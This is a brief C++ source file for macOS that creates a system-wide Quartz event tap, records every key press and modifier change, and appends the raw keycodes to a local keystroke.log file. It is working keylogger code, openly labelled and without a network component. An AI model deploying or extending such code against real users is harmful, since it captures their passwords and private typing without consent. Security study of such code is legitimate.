#include <iostream>
#include <fstream>
#include <stdio.h>
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>
// https://developer.apple.com/library/mac/documentation/Carbon/Reference/QuartzEventServicesRef/Reference/reference.html

using namespace std;

const char *logfileLocation = "./keystroke.log";
fstream logfile;
CGEventRef CGEventCallback (CGEventTapProxy, CGEventType, CGEventRef, void *);

int main(int argc, const char *argv[]) {

    CGEventFlags flags = CGEventSourceFlagsState(kCGEventSourceStateCombinedSessionState);
    CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
    CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, CGEventCallback, &flags);

    if(!eventTap) {
        cout << "You need to enable \"Enable access for assistive devices\" in the System Preferences Accessibility panel." << endl;
        exit(1);
    }

    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);

    logfile.open(logfileLocation, ios::out);
    logfile << "Keylogging started.\n\n";
    CFRunLoopRun();

    return 0;
}

CGEventRef CGEventCallback (CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    if ((type != kCGEventKeyDown) && (type != kCGEventFlagsChanged)) { 
        return event;
    }
    CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    logfile << keyCode;
    return event;
}